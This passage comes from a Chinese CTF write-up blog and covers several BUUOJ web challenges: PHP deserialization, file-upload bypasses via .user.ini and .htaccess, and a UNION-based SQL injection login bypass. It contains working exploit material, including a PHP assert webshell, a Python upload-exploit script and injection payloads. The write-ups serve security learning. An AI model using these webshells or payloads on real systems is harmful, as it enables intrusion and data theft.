        &#125;
    &#125;

    private function read() &#123;
        $res = &quot;&quot;;
        if(isset($this-&gt;filename)) &#123;
            $res = file_get_contents($this-&gt;filename);
        &#125;
        return $res;
    &#125;

    private function output($s) &#123;
        echo &quot;[Result]: &lt;br&gt;&quot;;
        echo $s;
    &#125;

    function __destruct() &#123;
        if($this-&gt;op === &quot;2&quot;)
            $this-&gt;op = &quot;1&quot;;
        $this-&gt;content = &quot;&quot;;
        $this-&gt;process();
    &#125;

&#125;

function is_valid($s) &#123;
    for($i = 0; $i &lt; strlen($s); $i++)
        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
            return false;
    return true;
&#125;

if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
    $str = (string)$_GET[&#39;str&#39;];
    if(is_valid($str)) &#123;
        $obj = unserialize($str);
    &#125;

&#125;
</code></pre>
<p>需要注意的就是class中的变量是protectde，反序列化后会出现不可见字符，从而导致is_valid函数返回false，所以这里利用php7.1+的一个特性，对属性类型不敏感，本地序列化时只需改成public就能绕过</p>
<pre><code class="php">&lt;?php
class FileHandler &#123;
    public $op=2;
    public $filename=&quot;flag.php&quot;;
&#125;
echo serialize(new FileHandler);
</code></pre>
<p>找个环境运行一下即可得到str的值</p>
<h3 id="2023-6-9-SUCTF-2019-CheckIn"><a href="#2023-6-9-SUCTF-2019-CheckIn" class="headerlink" title="2023.6.9 [SUCTF 2019]CheckIn"></a>2023.6.9 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">[SUCTF 2019]CheckIn</a></h3><p>是一道文件上传题，不过给了源码，甚至给了wp。瞥了一眼，发现wp里只有.user.ini，搜索一下之后发现这是一个比.htaccess用的更广的一个绕过手段，.htaccess只有apache环境下可以使用，而.user.ini只要是以fastcgi运行的php都可以用，他会影响php.ini中的配置，需要php&gt;5.3.0，且上传目录下要有可执行的php文件。</p>
<p>如何使用：我们指定一个文件，那么该文件就会被包含在要执行的php文件中，类似在php文件中插入<code>require(xx);</code>，我们就可以上传一个文件名为.user.ini的文件，内容为</p>
<pre><code class="php">auto_prepend_file = xxx.jpg
</code></pre>
<p>然后看他给的源码</p>
<pre><code class="php">$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);
if (!file_exists($userdir)) &#123;
    mkdir($userdir, 0777, true);
&#125;
file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);
if (isset($_POST[&quot;upload&quot;])) &#123;
    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];
    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];
    if (!$tmp_name) &#123;
        die(&quot;filesize too big!&quot;);
    &#125;
    if (!$name) &#123;
        die(&quot;filename cannot be empty!&quot;);
    &#125;
    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);
    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;
        die(&quot;illegal suffix!&quot;);
    &#125;
    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;
        die(&quot;&amp;lt;? in contents!&quot;);
    &#125;
    $image_type = exif_imagetype($tmp_name);
    if (!$image_type) &#123;
        die(&quot;exif_imagetype:not image!&quot;);
    &#125;
    $upload_file_path = $userdir . &quot;/&quot; . $name;
    move_uploaded_file($tmp_name, $upload_file_path);
    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;
    echo &#39;Your files : &lt;br&gt;&#39;;
    var_dump(scandir($userdir));
&#125;
</code></pre>
<p>发现他过滤了很多东西，.htaccess在这里是不能用了，文件名中包含ph的也都不能用了，还验证了文件头，这题只能上传图片，看到之前的利用这题就很简单了</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306091033911.png" alt="image-20230609103336765"></p>
<p>这里还给出了路径，由于过滤了<code>&lt;?</code>所以我们要换个马上传</p>
<pre><code class="php">&lt;script language=&#39;php&#39;&gt;assert($_POST[&#39;ant&#39;]);&lt;/script&gt;
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306091036996.png" alt="image-20230609103630041"></p>
<p>上传后路径并没有改变，接下来就可以去利用了，通过给出的路径，访问其目录下的php文件，并用post传入参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306091037875.png" alt="image-20230609103717771"></p>
<p>最后cat即可得到flag，buu的这个环境里的文件好像是有时效的，过期了需要重新上传再做</p>
<h3 id="2023-7-19-GXYCTF2019-BabyUpload"><a href="#2023-7-19-GXYCTF2019-BabyUpload" class="headerlink" title="2023.7.19 [GXYCTF2019]BabyUpload"></a>2023.7.19 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]BabyUpload">[GXYCTF2019]BabyUpload</a></h3><p>是一道文件上传题，进去先传马</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192223945.png" alt="image-20230719222306913"></p>
<p>，和图片</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192222387.png" alt="image-20230719222204328"></p>
<p>不知道为什么正常图片也无法上传，这里也过滤了后缀，简单的更改content-type是不行的，先尝试能上传什么类型的文件，试了许多最后发现image&#x2F;jpeg是可行的，但是之前上传的图片却提示失败，可能是图片中有黑名单内容</p>
<p>想如何去修改解析，由于是Apache</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192231581.png" alt="image-20230719223140617">，所以尝试上传.htaccess，发现成功，并给出路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192232066.png" alt="image-20230719223214201"></p>
<p>后面在上传木马，发现有过滤</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192239024.png" alt="image-20230719223931810"></p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192239778.png" alt="image-20230719223956613">过滤的是&lt;?，更换木马</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307192240847.png" alt="image-20230719224034476"></p>
<p>上传成功，As连接，flag在根目录下。</p>
<p>出题人给了python脚本，我觉得可以去学习一下</p>
<pre><code class="python">import requests

url = &#39;http://017fd17f-2d88-44c1-b6d0-e8be288d64da.node4.buuoj.cn:81/&#39;
session = requests.session()
htaccess = &#123;&#39;uploaded&#39;: (&#39;.htaccess&#39;, &quot;AddType application/x-httpd-php .she&quot;, &#39;image/jpeg&#39;)&#125;
res_hta = session.post(url, files=htaccess)

files = &#123;&#39;uploaded&#39;: (&#39;ant.she&#39;, &quot;&lt;script language=\&quot;php\&quot;&gt;echo file_get_contents(&#39;/flag&#39;);&lt;/script&gt;&quot;, &#39;image/jpeg&#39;)&#125;
res_jpg = session.post(url, files=files)

res_shell = session.post(url + res_jpg.text[-69:-22], data=&#123;&#39;a&#39;: &#39;echo file_get_contents(\&#39;/flag\&#39;);&#39;&#125;) 

print(res_shell.text)
</code></pre>
<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]BabySQli">[GXYCTF2019]BabySQli</a></h3><p>尝试任意登录发现是post传参，于是抓包，在返回包中发现提示：<code>&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</code> 看到是base32，解码后得到</p>
<pre><code class="sql">select * from user where username = &#39;$name&#39;
</code></pre>
<p>想用联合查询尝试注入，发现有过滤，用bp跑一下注入字典，发现过滤了好多关键字</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307222329698.png" alt="image-20230722232942534"></p>
<p>通过sqlmap可以得到数据库中账户密码的md5</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307230041248.png" alt="image-20230723004126295"></p>
<p>之后去查md5并没有得到结果，看wp之后知道联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据。 </p>
<p>例如用</p>
<pre><code class="sql">select * from users union select 1,&#39;admin&#39;,md5(123)；
</code></pre>
<p>就会在原有数据下加上后面这一条，所以我们可以构造</p>
<pre><code class="sql">name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123
</code></pre>
<p>这样就能得到结果。</p>
<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202307232356601.png" alt="image-20230723235620443"></p>

    </div>
    
    
    
    
    <div id="comment">
        <div id="giscus-container" class="giscus"></div>
    </div>
    
    
    
    
</div>

                <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2023 - 2023
                    嘉然今天学什么
                        <span id="footer-icon">
                            <i class="fa-solid fa-font-awesome fa-fw"></i>
                        </span>
                        &commat;fc235
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        

    </div>
</footer>
            </div>
            </transition>
            
            <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
            </transition>
            
        </div>
        <script src="/js/main.js"></script>
        
        
<script
    src="https://giscus.app/client.js"
    data-repo="fc235/comment"
    data-repo-id="R_kgDOJW5fXA"
    data-category="Announcements"
    data-category-id="DIC_kwDOJW5fXM4CVyQR"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="1"
    data-input-position="bottom"
    data-theme="preferred_color_scheme"
    data-lang="zh-CN"
    crossorigin
    async
></script>





        
    </body>
</html>
